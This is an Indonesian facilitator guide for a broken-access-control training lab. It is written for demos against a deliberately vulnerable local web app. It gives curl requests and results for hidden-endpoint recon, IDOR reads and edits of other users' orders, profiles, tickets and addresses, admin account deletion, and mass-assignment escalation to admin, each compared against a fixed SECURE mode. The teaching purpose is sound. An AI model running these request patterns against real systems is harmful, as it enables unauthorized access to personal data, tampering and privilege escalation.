# FACILITATOR — Beyond Authentication: Exploiting Broken Access Control

Panduan ini memetakan setiap skenario lab ke sesi demo dan hands-on, lengkap
dengan request contoh, hasil **expected vs actual**, serta dampak yang bisa
ditunjukkan tanpa menggeneralisasi severity.

> Asumsi pemetaan (karena slide tidak disertakan dalam repo):
> **Demo 02** = recon & endpoint tersembunyi, **Demo 03** = IDOR/BOLA horizontal,
> **Demo 04** = privilege escalation/BFLA + remediation. Jika urutan slide Anda
> berbeda, pindahkan labelnya; isi skenarionya tetap sama.

---

## 0. Persiapan fasilitator

```bash
npm install
npm run build
npm test              # 30 tes harus hijau sebelum seminar
npm start             # VULN  -> http://127.0.0.1:3000
```

Siapkan dua terminal:

- Terminal A: `npm start` (VULN).
- Terminal B: `PORT=3001 npm run start:secure` (SECURE), untuk perbandingan
  tanpa menghentikan server demo.

Gunakan browser bawaan Burp atau Firefox dengan
`network.proxy.allow_hijacking_localhost = true`.

Ambil token sekali di awal setiap demo:

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"Password123!"}' \
  | node -pe 'JSON.parse(fs.readFileSync(0)).token')
```

Restart server di antara demo yang mengubah data (alamat, role, hapus user).

---

## 1. Peta sesi

| Skenario | Demo | Hands-on | Bukti yang diharapkan |
|---|---|---|---|
| Menemukan `/openapi.json` dan endpoint admin | **Demo 02** | Tugas 1 | daftar path, termasuk `/api/admin/*` |
| Membaca source dari bundle + sourcemap | **Demo 02** | Tugas 1 | nama halaman Admin + path API |
| Menemukan panel admin di bundle | **Demo 02** | Tugas 1 | menu tersembunyi, route `/admin` |
| `GET /api/admin/audit-log` → 403 | **Demo 02** | Tugas 2 | 403 di VULN **dan** SECURE |
| `GET /api/orders/:id` milik orang lain | **Demo 03** | Tugas 3 | 200 + order + alamat bob |
| `GET /api/users/:id/profile` milik orang lain | **Demo 03** | Tugas 3 | 200 + email/telepon |
| `GET /api/tickets/:id` milik orang lain | **Demo 03** | Tugas 3 | 200 + `internalNotes` |
| `PATCH /api/addresses/:id` milik orang lain | **Demo 03** | Tugas 3 | 200 + alamat berubah |
| `PATCH /api/users/me` dengan `role` | **Demo 04** | Tugas 4 | 200, role jadi `admin` |
| `GET /api/admin/users` tanpa role admin | **Demo 04** | Tugas 4 | 200 + 6 akun |
| `DELETE /api/admin/users/:id` tanpa role admin | **Demo 04** | Tugas 4 | 204, akun hilang |
| Semua di atas di SECURE | **Demo 04** | Tugas 5 | 403 / role diabaikan |
| Menyusun PoC (expected vs actual) | **Demo 04** | Tugas 6 | template PoC terisi |

---

## 2. Demo 02 — Recon: endpoint yang tidak terlihat di UI

**Tujuan:** peserta melihat bahwa permukaan serangan tidak sama dengan menu.

### 2.1 OpenAPI parsial

```bash
curl -s http://127.0.0.1:3000/openapi.json | head -c 600
```

Expected (peserta): menemukan path yang tidak ada di navigasi.

Actual:

```text
/api/auth/login, /api/users/me, /api/users/{id}/profile, /api/orders,
/api/orders/{id}, /api/addresses/{id}, /api/tickets/{id},
/api/admin/users, /api/admin/users/{id}, /api/admin/audit-log
```

Point: dokumen ini **parsial**; tidak semua route didokumentasikan, dan
keberadaan di dokumen bukan bukti kerentanan.

### 2.2 Bundle dan sourcemap

```bash
grep -o '/api/admin/[a-z-]*' server/public/assets/*.js | sort -u
curl -sI http://127.0.0.1:3000/assets/index-*.js.map | head -5
```

Expected: path admin terlihat, bundle tidak diminify, sourcemap tersedia.
Actual: `/api/admin/audit-log` dan `/api/admin/users` muncul; buka sourcemap di
DevTools → Sources, source JSX asli bisa dibaca.

### 2.3 Panel admin hanya disembunyikan di UI

1. Login sebagai `alice`.
2. Perhatikan menu: Katalog, Ringkasan, Pesanan, Invoice, Bantuan; tidak ada menu Operasional.
3. Buka `http://127.0.0.1:3000/admin` langsung.

Expected: halaman ditolak.
Actual (VULN): halaman “Operasional” tampil dan memuat daftar 6 akun.
Point: **UI bukan kontrol akses**; route tetap ada di bundle.

### 2.4 Kontrol negatif

```bash
curl -i http://127.0.0.1:3000/api/admin/audit-log \
  -H "Authorization: Bearer $TOKEN"
```

Expected: 403.
Actual: **403** juga di mode SECURE.

Point yang harus diucapkan: “endpoint tersembunyi dan berhasil ditemukan ≠
rentan”. Ini yang membedakan temuan dari sekadar observasi.

---

## 3. Demo 03 — IDOR/BOLA horizontal

Gunakan `alice` (ID 1001) sebagai penyerang. Korban: `bob` (1002) dan
`dian` (2001).

### 3.1 Baca order bob

```bash
curl -i http://127.0.0.1:3000/api/orders/5002 \
  -H "Authorization: Bearer $TOKEN"
```

Expected: 403 (bukan milik alice).
Actual VULN: **200**, berisi order 5002 (total Rp 938.000, kurir SiCepat,
nomor resi) **beserta alamat pengiriman bob** (Jl. Gatot Subroto, Jakarta
Selatan, telepon 0813-2200-1002).

Dampak spesifik: alice bisa membaca isi pesanan, nomor resi, dan data
pengiriman pelanggan lain. Bukan sekadar “bocor data”: kombinasi resi + alamat
+ telepon cukup untuk mengklaim paket secara sosial.

### 3.2 Baca profil bob

```bash
curl -i http://127.0.0.1:3000/api/users/1002/profile \
  -H "Authorization: Bearer $TOKEN"
```

Actual VULN: **200** dengan `email`, `phone`, `loyaltyTier`, `joinedAt`.
Expected: 403.

Dampak: enumerasi profil (ID berurutan) → email/telepon pelanggan. Di lab ini
datanya fiktif; di aplikasi nyata ini bahan phishing/account enumeration.

### 3.3 Baca tiket dian (termasuk internal notes)

```bash
curl -i http://127.0.0.1:3000/api/tickets/4003 \
  -H "Authorization: Bearer $TOKEN"
```

Actual VULN: **200**; field `internalNotes` memuat alamat penjemputan dan
nomor kontak dian.

Expected: 403.

Dampak: catatan internal tim operasional (alamat, kontak, rencana
penggantian) terekspos ke pelanggan lain.

### 3.4 Ubah alamat bob

```bash
curl -i -X PATCH http://127.0.0.1:3000/api/addresses/3002 \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"id":3002,"recipient":"Alice Prameswari","line1":"Jl. Contoh 1","city":"Bandung","postalCode":"40111","phone":"0812-0000-0000"}'
```

Expected: 403.
Actual VULN: **200**, alamat 3002 berubah; order 5002 (milik bob) memakai
alamat tersebut.

Dampak spesifik: tujuan pengiriman order orang lain bisa diubah. Ini bukan
“data exposure” tetapi integritas transaksi — tunjukkan `GET /api/orders/5002`
setelah patch untuk memperlihatkan alamat baru terpasang pada order bob.

Catatan demo: `id` di body tidak menentukan target (path yang menentukan); ini
menjelaskan mengapa menambahkan pengecekan di body bukan perbaikan.

### 3.5 Verifikasi cepat di SECURE

```bash
curl -i http://127.0.0.1:3001/api/orders/5002 \
  -H "Authorization: Bearer $SECURE_TOKEN"
```

Actual: **403**. Ulangi untuk profil, tiket, dan PATCH alamat.

---

## 4. Demo 04 — Vertical: BFLA dan privilege escalation

### 4.1 BFLA tanpa eskalasi (endpoint admin)

```bash
curl -i http://127.0.0.1:3000/api/admin/users \
  -H "Authorization: Bearer $TOKEN"
```

Expected: 403.
Actual VULN: **200**, 6 akun lengkap dengan email, telepon, role.

```bash
curl -i -X DELETE http://127.0.0.1:3000/api/admin/users/2001 \
  -H "Authorization: Bearer $TOKEN"
```

Actual VULN: **204**. Setelah itu login `dian` gagal (401).

Dampak spesifik: penghapusan akun pelanggan oleh customer lain; tidak ada
tombol di UI, tetapi request tetap diterima server.

### 4.2 Mass assignment → role admin

```bash
curl -i -X PATCH http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
```

Expected: `role` tidak berubah.
Actual VULN: **200**, body respons menunjukkan `"role":"admin"` untuk alice.

Lalu buktikan eskalasinya:

```bash
curl -s http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $TOKEN"
# -> role: admin

curl -i http://127.0.0.1:3000/api/admin/users \
  -H "Authorization: Bearer $TOKEN"
# -> 200
```

Di UI: reload halaman setelah patch; menu “Operasional” muncul karena frontend
membaca ulang profil. Ini mendemonstrasikan bahwa penyembunyian menu bergantung
pada data yang bisa diubah penyerang.

Point: dua bug berbeda — (a) field `role` diterima dari body, (b) endpoint admin
tidak memeriksa role. Perbaiki keduanya; memperbaiki salah satu saja tidak cukup.

### 4.3 Remediation — jalankan ulang di SECURE

Di `http://127.0.0.1:3001`:

| Request | Expected | Actual SECURE |
|---|---|---|
| `GET /api/orders/5002` (alice) | 403 | 403 |
| `GET /api/users/1002/profile` (alice) | 403 | 403 |
| `GET /api/tickets/4003` (alice) | 403 | 403 |
| `PATCH /api/addresses/3002` (alice) | 403 | 403 |
| `PATCH /api/users/me {"role":"admin"}` | role tetap customer | 200, role tetap `customer` |
| `GET /api/admin/users` (alice) | 403 | 403 |
| `DELETE /api/admin/users/2001` (alice) | 403 | 403 |
| `GET /api/admin/audit-log` (alice) | 403 | 403 |
| `GET /api/admin/users` (admin) | 200 | 200 |
| `GET /api/users/1002/profile` (admin) | 200 | 200 |

Tunjukkan `server/authz.js` dan komentar `// VULN[...]` / `// FIX:` di route.
Tutup dengan `npm test` — 30 tes mengunci perilaku ini.

---

## 5. Hands-on

Peserta mengerjakan [`PARTICIPANT.md`](PARTICIPANT.md). Checkpoint fasilitator:

| Tugas | Yang harus terlihat | Kesalahan umum |
|---|---|---|
| 1. Recon | path admin dari OpenAPI/bundle | hanya melihat menu UI |
| 2. Kontrol negatif | 403 untuk audit-log di VULN | menganggap 403 sebagai “gagal menemukan bug” |
| 3. IDOR | 200 + data bob/dian; PATCH alamat | lupa header Bearer; salah ID |
| 4. Escalation | role berubah; admin endpoint 200 | mengira UI tombol adalah kontrol |
| 5. SECURE | 403 / role diabaikan | lupa restart atau masih memakai token lama |
| 6. PoC | request, response, expected vs actual | menulis “bisa akses data” tanpa bukti |

Beri waktu 15–20 menit untuk hands-on, lalu bahas dua atau tiga PoC peserta.
Fokus pada kualitas bukti, bukan jumlah temuan.

---

## 6. Jebakan teknis yang sering muncul

| Gejala | Penyebab | Solusi |
|---|---|---|
| Request tidak muncul di Burp | browser bypass proxy untuk localhost | pakai browser Burp / `allow_hijacking_localhost` |
| 401 padahal sudah login | header hilang/typo, token kedaluwarsa, server restart | salin ulang `Authorization: Bearer ...` |
| 403 saat menguji endpoint admin | Anda menjalankan SECURE, atau memakai akun non-admin di SECURE | cek mode di banner console |
| Data “kembali seperti semula” | server di-restart | memang reset by design |
| `GET /api/orders` tidak menunjukkan order orang lain | endpoint list selalu memfilter pemilik di kedua mode | uji endpoint detail `/:id` |
| Patch alamat tidak mengubah apa pun | field yang dikirim tidak ada di allowlist | gunakan `recipient/line1/city/postalCode/phone/label` |
| 404, bukan 403 | ID tidak ada | pastikan ID seed benar (lihat README) |

---

## 7. Reset cepat antar demo

```bash
# hentikan server VULN, lalu:
npm start
```

Token lama otomatis invalid karena JWT secret dibuat ulang per proses. Tidak ada
endpoint reset HTTP — ini disengaja agar peserta tidak “merusak” lab secara
permanen tanpa restart.

---

## 8. Kalimat kunci untuk penutup

- Autentikasi di lab ini benar: password di-hash, JWT ditandatangani, token
  kedaluwarsa. Yang salah adalah **keputusan otorisasi**.
- UI menyembunyikan menu, tetapi server tetap harus memutuskan.
- Menemukan endpoint tersembunyi adalah awal recon, bukan temuan.
- Temuan yang layak = ada **aksi/data** yang seharusnya ditolak, dibuktikan
  dengan request dan respons, plus dampak konkret pada objek yang terlibat.
